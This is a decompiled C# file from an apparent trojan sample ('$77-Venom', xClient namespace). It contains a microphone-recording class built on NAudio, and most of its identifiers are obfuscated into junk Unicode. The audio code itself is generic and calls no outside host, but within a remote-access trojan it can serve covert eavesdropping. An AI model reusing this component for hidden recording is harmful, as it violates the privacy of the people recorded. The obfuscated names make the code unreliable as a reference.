// Decompiled with JetBrains decompiler
// Type: xClient.Core.NAudio.Wave.WaveInputs.WaveIn
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Trojan.MSIL.Zapchast.gen-2e1eda10e2bbd19418706a23888807e50c0407eb191cc26d541c85279193c3db.exe

using System;
using System.Runtime.InteropServices;
using System.Threading;
using xClient.Core.NAudio.Wave.WaveStreams;

namespace xClient.Core.NAudio.Wave.WaveInputs
{
  public class WaveIn : IWaveIn, IDisposable
  {
    private IntPtr waveInHandle;
    private volatile bool recording;
    private WaveInBuffer[] buffers;
    private readonly 珸\u25E1단ᑊ눵ꫤ\u1AC3ꥩ\uE659珟㳓坍鎸羅㺝ܩ\u173C\u2891\u2E15힘.磾䒦蠠ᅙᄵ\uE35E\u0F38煏位홐ᢜ톰Ⲽꢒ㟀\uE036앢ᤸ갏\u33E4 callback;
    private 肄鐕\u256D늨\uEEF4薑\u003D佭瞍縗\uE299\uFFFD户녨넶\uE6C7鈙鷏㒀\u0CFA callbackInfo;
    private readonly SynchronizationContext syncContext;
    private int lastReturnedBufferIndex;

    public event EventHandler<퓎ᾴ㓁䒧囉\uF78A\uF0C4嚑葧\uF759\u2706匠猕\u088E뾜厇铋鮟唏㪢> DataAvailable;

    public event EventHandler<鳷즤핿ེ嵔갔ᬅ벐յ\u297B\u3209䎪䌂\u2AA1侫\u3298嚃鲗쟈\uEDF5> RecordingStopped;

    public WaveIn()
      : this(肄鐕\u256D늨\uEEF4薑\u003D佭瞍縗\uE299\uFFFD户녨넶\uE6C7鈙鷏㒀\u0CFA.顣륱\uFFFD슧\u24C7\uE0A2ସᆄ䪹げ먫守㟗ೡ樅ᘘ쾯ᙧ\uFB19\uE750())
    {
    }

    public WaveIn(IntPtr windowHandle)
      : this(肄鐕\u256D늨\uEEF4薑\u003D佭瞍縗\uE299\uFFFD户녨넶\uE6C7鈙鷏㒀\u0CFA.迁潆鞫\u2072\uF52C\uF6EB샡ꨅ햍麭\uF4DE\uE02Fᵾ횕ꬖ甌땷\u0A4E놂돌(windowHandle))
    {
    }

    public WaveIn(
      肄鐕\u256D늨\uEEF4薑\u003D佭瞍縗\uE299\uFFFD户녨넶\uE6C7鈙鷏㒀\u0CFA callbackInfo)
    {
      this.syncContext = SynchronizationContext.Current;
      if ((callbackInfo.Strategy == ꄝ\uF6E5郷噾Ὀo僂鰒鮁뾳\uEA15\uE9E6罫䁡ꓟ㿋턟苖ⷔ\uFBB9.ᛳ\uF4D9쉿ꑛ䭍䕏톋Аꂬ慌\uF39B桄폀房\u0ADC작杀墹갚爇 || callbackInfo.Strategy == ꄝ\uF6E5郷噾Ὀo僂鰒鮁뾳\uEA15\uE9E6罫䁡ꓟ㿋턟苖ⷔ\uFBB9.怏舮䈀\u2861ꐛ甊䯠鋦콓囙愄쒓ﾱߜ畺짇វᇝ뻭ﻎ) && this.syncContext == null)
        throw new InvalidOperationException("Use WaveInEvent to record on a background thread");
      this.DeviceNumber = 0;
      this.WaveFormat = new 裞䨖觤㥟㛴먰\uEC41\u136C嵹乢\uE98Cᘁቫ륺끂볃\uF732\uFFFD枽侏(8000, 16, 1);
      this.BufferMilliseconds = 100;
      this.NumberOfBuffers = 3;
      this.callback = new 珸\u25E1단ᑊ눵ꫤ\u1AC3ꥩ\uE659珟㳓坍鎸羅㺝ܩ\u173C\u2891\u2E15힘.磾䒦蠠ᅙᄵ\uE35E\u0F38煏位홐ᢜ톰Ⲽꢒ㟀\uE036앢ᤸ갏\u33E4(this.Callback);
      this.callbackInfo = callbackInfo;
      callbackInfo.㨓퇗ଥ愼\uFFFDᡓ嚫㵻쥙ᗽ뜢杖ᘀ\uF282ጃ寶\uEA42衟ཬĎ(this.callback);
    }

    public static int DeviceCount => 珸\u25E1단ᑊ눵ꫤ\u1AC3ꥩ\uE659珟㳓坍鎸羅㺝ܩ\u173C\u2891\u2E15힘.팡年웮쪳᯲\uEF02\uFFFD棕\u2860뫖ጲ薂嫧ܪ\uFFFD䘐쯷襲螖\u22D1();

    public static 髹\uEC07㣒鶗禺\u2F05貥趣瞥봩载룏빇棵鸮\u2FAB씲磡뉄㙖 GetCapabilities(
      int devNumber)
    {
      髹\uEC07㣒鶗禺\u2F05貥趣瞥봩载룏빇棵鸮\u2FAB씲磡뉄㙖 waveInCaps = new 髹\uEC07㣒鶗禺\u2F05貥趣瞥봩载룏빇棵鸮\u2FAB씲磡뉄㙖();
      int waveInCapsSize = Marshal.SizeOf((object) waveInCaps);
      텆䙫簻冣캶\uFFFDꪃ뗫\u28E0\uFFFD㪠\uF818궤㤿淳寎\uE6B2䁻㡅톈.蹠鬽삕闦ڋଫ퐜螰梬갻\u27EF逇쭗ద먪䐧굚ᢧῇ衜(珸\u25E1단ᑊ눵ꫤ\u1AC3ꥩ\uE659珟㳓坍鎸羅㺝ܩ\u173C\u2891\u2E15힘.\uE43A\uFFFD莩礃\u0B59退蔂豅츕龜ⲱ䛮텁ﵫ䔺ᤷ\uEEFC惀\uE174幚((IntPtr) devNumber, out waveInCaps, waveInCapsSize), "waveInGetDevCaps");
      return waveInCaps;
    }

    public int BufferMilliseconds { get; set; }

    public int NumberOfBuffers { get; set; }

    public int DeviceNumber { get; set; }

    private void CreateBuffers()
    {
      int bufferSize = this.BufferMilliseconds * this.WaveFormat.AverageBytesPerSecond / 1000;
      if (bufferSize % this.WaveFormat.BlockAlign != 0)
        bufferSize -= bufferSize % this.WaveFormat.BlockAlign;
      this.buffers = new WaveInBuffer[this.NumberOfBuffers];
      for (int index = 0; index < this.buffers.Length; ++index)
        this.buffers[index] = new WaveInBuffer(this.waveInHandle, bufferSize);
    }

    private void Callback(
      IntPtr waveInHandle,
      珸\u25E1단ᑊ눵ꫤ\u1AC3ꥩ\uE659珟㳓坍鎸羅㺝ܩ\u173C\u2891\u2E15힘.Ïꭶ祃ᷫ苲肽쉒\uFFFDᆂ\uFFFD\u2361\uF081䨞\uED47\u2123蟌\uF6C4펾럨鐇 message,
      IntPtr userData,
      ﯗ䴺釉왋詃ฬ녹㕪璢ꛤ㼤వ饤儱\uEF79狺\u0880乚找隸 waveHeader,
      IntPtr reserved)
    {
      if (message != 珸\u25E1단ᑊ눵ꫤ\u1AC3ꥩ\uE659珟㳓坍鎸羅㺝ܩ\u173C\u2891\u2E15힘.Ïꭶ祃ᷫ苲肽쉒\uFFFDᆂ\uFFFD\u2361\uF081䨞\uED47\u2123蟌\uF6C4펾럨鐇.꼭阰澉\uEE24骧褥㼛挷宪셍\u262F쿕㳐㗴锗妲鈀跓培䀊 || !this.recording)
        return;
      WaveInBuffer target = (WaveInBuffer) ((GCHandle) waveHeader.氮䄹癕駩垹쁨\u2B39끦꿡͚\u2876\uA7BD᧓隔ꨩ鵥\uFFFD䍀呞皔).Target;
      if (target == null)
        return;
      this.lastReturnedBufferIndex = Array.IndexOf<WaveInBuffer>(this.buffers, target);
      this.RaiseDataAvailable(target);
      try
      {
        target.Reuse();
      }
      catch (Exception ex)
      {
        this.recording = false;
        this.RaiseRecordingStopped(ex);
      }
    }

    private void RaiseDataAvailable(WaveInBuffer buffer)
    {
      EventHandler<퓎ᾴ㓁䒧囉\uF78A\uF0C4嚑葧\uF759\u2706匠猕\u088E뾜厇铋鮟唏㪢> dataAvailable = this.DataAvailable;
      if (dataAvailable == null)
        return;
      dataAvailable((object) this, new 퓎ᾴ㓁䒧囉\uF78A\uF0C4嚑葧\uF759\u2706匠猕\u088E뾜厇铋鮟唏㪢(buffer.Data, buffer.BytesRecorded));
    }

    private void RaiseRecordingStopped(Exception e)
    {
      EventHandler<鳷즤핿ེ嵔갔ᬅ벐յ\u297B\u3209䎪䌂\u2AA1侫\u3298嚃鲗쟈\uEDF5> handler = this.RecordingStopped;
      if (handler == null)
        return;
      if (this.syncContext == null)
        handler((object) this, new 鳷즤핿ེ嵔갔ᬅ벐յ\u297B\u3209䎪䌂\u2AA1侫\u3298嚃鲗쟈\uEDF5(e));
      else
        this.syncContext.Post((SendOrPostCallback) (state => handler((object) this, new 鳷즤핿ེ嵔갔ᬅ벐յ\u297B\u3209䎪䌂\u2AA1侫\u3298嚃鲗쟈\uEDF5(e))), (object) null);
    }

    private void OpenWaveInDevice()
    {
      this.CloseWaveInDevice();
      텆䙫簻冣캶\uFFFDꪃ뗫\u28E0\uFFFD㪠\uF818궤㤿淳寎\uE6B2䁻㡅톈.蹠鬽삕闦ڋଫ퐜螰梬갻\u27EF逇쭗ద먪䐧굚ᢧῇ衜(this.callbackInfo.틩珿뽦㻿棊뺓\u28B7ጵ侁\uEDF8衕\u0387\u2EF5몃\uEC7A\uF66F\u2AB8Ė䙿蓛(out this.waveInHandle, this.DeviceNumber, this.WaveFormat, this.callback), "waveInOpen");
      this.CreateBuffers();
    }

    public void StartRecording()
    {
      if (this.recording)
        throw new InvalidOperationException("Already recording");
      this.OpenWaveInDevice();
      this.EnqueueBuffers();
      텆䙫簻冣캶\uFFFDꪃ뗫\u28E0\uFFFD㪠\uF818궤㤿淳寎\uE6B2䁻㡅톈.蹠鬽삕闦ڋଫ퐜螰梬갻\u27EF逇쭗ద먪䐧굚ᢧῇ衜(珸\u25E1단ᑊ눵ꫤ\u1AC3ꥩ\uE659珟㳓坍鎸羅㺝ܩ\u173C\u2891\u2E15힘.䚽ㄝ挨\uE7F3솭碙\uF698\u175Aﻜ砘\u1941鎻퀸\u28AE倨껱屚\uFFFD뙼瞘(this.waveInHandle), "waveInStart");
      this.recording = true;
    }

    private void EnqueueBuffers()
    {
      foreach (WaveInBuffer buffer in this.buffers)
      {
        if (!buffer.InQueue)
          buffer.Reuse();
      }
    }

    public void StopRecording()
    {
      if (!this.recording)
        return;
      this.recording = false;
      텆䙫簻冣캶\uFFFDꪃ뗫\u28E0\uFFFD㪠\uF818궤㤿淳寎\uE6B2䁻㡅톈.蹠鬽삕闦ڋଫ퐜螰梬갻\u27EF逇쭗ద먪䐧굚ᢧῇ衜(珸\u25E1단ᑊ눵ꫤ\u1AC3ꥩ\uE659珟㳓坍鎸羅㺝ܩ\u173C\u2891\u2E15힘.\u18F8閏ꦟᩍ顎襻혷莮氈묳헟푓旷Ӻ᠔䮼证㭝\u2673㚱(this.waveInHandle), "waveInStop");
      for (int index = 0; index < this.buffers.Length; ++index)
      {
        WaveInBuffer buffer = this.buffers[(index + this.lastReturnedBufferIndex + 1) % this.buffers.Length];
        if (buffer.Done)
          this.RaiseDataAvailable(buffer);
      }
      this.RaiseRecordingStopped((Exception) null);
    }

    public 裞䨖觤㥟㛴먰\uEC41\u136C嵹乢\uE98Cᘁቫ륺끂볃\uF732\uFFFD枽侏 WaveFormat { get; set; }

    protected virtual void Dispose(bool disposing)
    {
      if (!disposing)
        return;
      if (this.recording)
        this.StopRecording();
      this.CloseWaveInDevice();
      if (this.callbackInfo == null)
        return;
      this.callbackInfo.冹茛\u2A03랉題ⲡͧ伣㟺\uE241ཌ僈䭥ꩣᏭ흹譬榅ꇤꝾ();
      this.callbackInfo = (肄鐕\u256D늨\uEEF4薑\u003D佭瞍縗\uE299\uFFFD户녨넶\uE6C7鈙鷏㒀\u0CFA) null;
    }

    private void CloseWaveInDevice()
    {
      if (this.waveInHandle == IntPtr.Zero)
        return;
      int num1 = (int) 珸\u25E1단ᑊ눵ꫤ\u1AC3ꥩ\uE659珟㳓坍鎸羅㺝ܩ\u173C\u2891\u2E15힘.笂䝉낋ꓷ隌㴐䮘듞\uED52暷䖤穳鰹屭雾឵䲩ힳ梴훆(this.waveInHandle);
      if (this.buffers != null)
      {
        for (int index = 0; index < this.buffers.Length; ++index)
          this.buffers[index].Dispose();
        this.buffers = (WaveInBuffer[]) null;
      }
      int num2 = (int) 珸\u25E1단ᑊ눵ꫤ\u1AC3ꥩ\uE659珟㳓坍鎸羅㺝ܩ\u173C\u2891\u2E15힘.\uE839꾤趥팞\u2494॔䑅ﭮ碧䜋搿畦勴攽\uF529䜍钜侺ꡐ닞(this.waveInHandle);
      this.waveInHandle = IntPtr.Zero;
    }

    public \uF2CAᬔ髻\uE4C6닸\uF7DF擎ꛇ\uEDF0\uFFFD㑐\uE4BAꕓዪ锱䲾㓑疖\uF8CCＭ GetMixerLine() => !(this.waveInHandle != IntPtr.Zero) ? new \uF2CAᬔ髻\uE4C6닸\uF7DF擎ꛇ\uEDF0\uFFFD㑐\uE4BAꕓዪ锱䲾㓑疖\uF8CCＭ((IntPtr) this.DeviceNumber, 0, 骊쀁岬֫膒朸颅搹Ⳕ禈ꕷﴻＪ觟䪽Ȁꢹⱝ㶼疡.ᯢ\u330B뮛諒蹻샋浢봀炚㤘䌳嫿廂\u08C0맹쏧䘃\uF533ﲍꅬ) : new \uF2CAᬔ髻\uE4C6닸\uF7DF擎ꛇ\uEDF0\uFFFD㑐\uE4BAꕓዪ锱䲾㓑疖\uF8CCＭ(this.waveInHandle, 0, 骊쀁岬֫膒朸颅搹Ⳕ禈ꕷﴻＪ觟䪽Ȁꢹⱝ㶼疡.䨈ڍ끪\u1FFF汎赓휏蠡褍瓤总洅삉鄞迮븆䛂\uE85C\u171C빵);

    public void Dispose()
    {
      this.Dispose(true);
      GC.SuppressFinalize((object) this);
    }
  }
}
